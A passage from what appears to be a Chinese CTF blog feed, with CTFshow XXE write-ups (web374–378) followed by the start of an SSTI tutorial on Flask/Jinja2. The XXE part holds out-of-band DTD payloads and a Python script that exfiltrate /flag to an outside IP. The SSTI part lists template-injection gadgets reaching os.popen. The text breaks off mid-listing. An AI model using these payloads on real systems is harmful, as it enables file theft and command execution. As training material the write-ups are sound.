function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xxe</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$xxe</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd"># payload.dtd&lt;!ENTITY % all&quot;&lt;!ENTITY &#x25; send SYSTEM &#39;http:&#x2F;&#x2F;xxx&#x2F;xxe.php?q&#x3D;%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>然后发送POST请求</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;payload.dtd&quot;&gt;%dtd;%send;] &gt;</code></pre><h4 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?xml version="1\.0"/'</span><span class="token punctuation">,</span> <span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>相较于上题，多了一个正则表达式，过滤了<code>&lt;?xml version=&quot;1.0&quot;</code>这个字符串</p><p>可以多打几个空格绕过或者直接不写声明也可以</p><p>上题做法同样可以</p><h4 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h4><p>相较于上题，过滤了<code>&lt;?xml version=&quot;1.0&quot;</code>这个字符串同时，<code>/i</code>模式把大小写都过滤了。</p><p>依旧以上方法</p><h4 id="web377-UTF-16"><a href="#web377-UTF-16" class="headerlink" title="web377(UTF-16)"></a>web377(UTF-16)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?xml version="1\.0"|http/i'</span><span class="token punctuation">,</span> <span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   </span></code></pre><p>过滤了http</p><p>可以用UTF-16绕过</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://ee601bc7-6229-49ad-af80-541d5a0b662c.challenge.ctf.show/'</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">&lt;!ENTITY % dtd SYSTEM "http://156.238.233.95/xxe/payload.dtd">%dtd;%send;] >"""</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span></code></pre><h4 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h4><p>开始是个登录框，随便输入后抓包</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY hsad SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hsad;">&amp;hsad;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hsad;">&amp;hsad;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>直接打就行</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-ssti</title>
      <link href="/2024/08/05/web%E5%85%A5%E9%97%A8-ssti/"/>
      <url>/2024/08/05/web%E5%85%A5%E9%97%A8-ssti/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SSTI主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p><p><a href="https://blog.csdn.net/qq_51096893/article/details/122020518">Bugku CTF——WEB之SSTI学习笔记_ctf ssti-CSDN博客</a></p><p><a href="https://www.cnblogs.com/dojo-lzz/p/5518474.html">浅谈模板引擎 - 木的树 - 博客园</a></p><p><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p><h4 id="Flask："><a href="#Flask：" class="headerlink" title="Flask："></a>Flask：</h4><p>Flask是一个Python编写的Web 微框架，让我们可以使用Python语言快速实现一个网站或Web服务，在介绍Flask之前首先来聊下它和Django的联系以及区别，django个大而全的web框架，它内置许多模块，flask是一个小而精的轻量级框架，Django功能大而全，Flask只包含基本的配置, Django的一站式解决的思路，能让开发者不用在开发之前就在选择应用的基础设施上花费大量时间。Django有模板，表单，路由，基本的数据库管理等等内建功能。与之相反，Flask只是一个内核，默认依赖于2个外部库： Jinja2 模板引擎和 WSGI工具集–Werkzeug , flask的使用特点是基本所有的工具使用都依赖于导入的形式去扩展，flask只保留了web开发的核心功能。</p><p><img src="begin_1.png" alt="img" loading="lazy"></p><p><img src="begin_2.png" alt="img" loading="lazy"></p><h4 id="Python魔术方法"><a href="#Python魔术方法" class="headerlink" title="Python魔术方法"></a>Python魔术方法</h4><p><strong>class</strong>#查找当前类型的所属对象</p><p><strong>base</strong>_# 沿着父子类的关系往上走一个</p><p><strong>mro</strong> # 查找当前类对象的所有继承类</p><p><strong>subclasses</strong> ()# 查找父类下的所有子类</p><p><strong>init</strong> #查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中如果出现wrapper字眼，说明没有重载</p><p><strong>globals</strong> #函数会议字典的形式返回当前对象的全部全局变量</p><p><img src="begin_3.png" alt="img" loading="lazy"></p><p><strong>jinjia格式</strong></p><pre class="language-python" data-language="python"><code class="language-python">控制结构 <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>变量取值 <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>注释 <span class="token punctuation">&#123;</span><span class="token comment"># #&#125;</span></code></pre><p><strong>了解python的几个函数解析</strong></p><pre class="language-python" data-language="python"><code class="language-python">__class__            类的一个内置属性，表示实例对象的类。__base__             类型对象的直接基类__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>     返回这个类的子类集合，Each <span class="token keyword">class</span> <span class="token class-name">keeps</span> a <span class="token builtin">list</span> of weak references to its immediate subclasses<span class="token punctuation">.</span> This method returns a <span class="token builtin">list</span> of <span class="token builtin">all</span> those references still alive<span class="token punctuation">.</span> The <span class="token builtin">list</span> <span class="token keyword">is</span> <span class="token keyword">in</span> definition order<span class="token punctuation">.</span>__init__             初始化类，返回的类型是function__globals__          使用方式是 函数名<span class="token punctuation">.</span>__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__<span class="token punctuation">(</span><span class="token punctuation">)</span>   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行<span class="token punctuation">.</span>操作的时候（形如：a<span class="token punctuation">.</span>xxx<span class="token operator">/</span>a<span class="token punctuation">.</span>xxx<span class="token punctuation">(</span><span class="token punctuation">)</span>），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__<span class="token punctuation">(</span><span class="token punctuation">)</span>        调用字典中的键值，其实就是调用这个魔术方法，比如a<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span>，就是a<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。<span class="token builtin">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span>            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum<span class="token punctuation">.</span>__globals__含有os模块：<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>current_app          应用上下文，一个全局变量。request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="token builtin">open</span>函数<span class="token punctuation">:</span>request<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/proc\self\fd/3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>x1    get传参request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x1  所有参数request<span class="token punctuation">.</span>cookies      cookies参数request<span class="token punctuation">.</span>headers      请求头参数request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>x1    post传参<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>applicaation<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded或multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">)</span>request<span class="token punctuation">.</span>data   post传参<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span>request<span class="token punctuation">.</span>json post传json  <span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>json<span class="token punctuation">)</span>config               当前application的所有配置。此外，也可以这样<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>g                    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>得到<span class="token operator">&lt;</span>flask<span class="token punctuation">.</span>g of <span class="token string">'flask_ssti'</span><span class="token operator">></span></code></pre><h4 id="一些利用语句"><a href="#一些利用语句" class="headerlink" title="一些利用语句"></a>一些利用语句</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 获得一个字符串实例</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token string">''</span><span class="token comment"># 获得字符串的type实例</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__ <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token comment"># 获得其父类</span><span class="token operator">>></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token comment"># 获得父类中的object类</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token comment"># 获得object类的子类，但发现这个__subclasses__属性是个方法</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> method __subclasses__ of <span class="token builtin">type</span> <span class="token builtin">object</span> at <span class="token number">0x10376d320</span><span class="token operator">></span><span class="token comment"># 使用__subclasses__()方法，获得object类的子类</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'type'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakref'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'weakproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'int'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'basestring'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'bytearray'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NoneType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'NotImplementedType'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'traceback'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'super'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'xrange'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'buffer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'long'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classobj'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dictproxy'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'instance'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'file'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'callable-iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.long_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.float_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.version_info'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'sys.flags'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'exceptions.BaseException'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'imp.NullImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.stat_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'posix.statvfs_result'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset._IterationGuard'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_weakrefset.WeakSet'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Hashable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Iterable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Sized'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Container'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abcoll.Callable'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_keys'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_items'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'dict_values'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Printer'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site._Helper'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Pattern'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Match'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'_sre.SRE_Scanner'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'site.Quitter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token 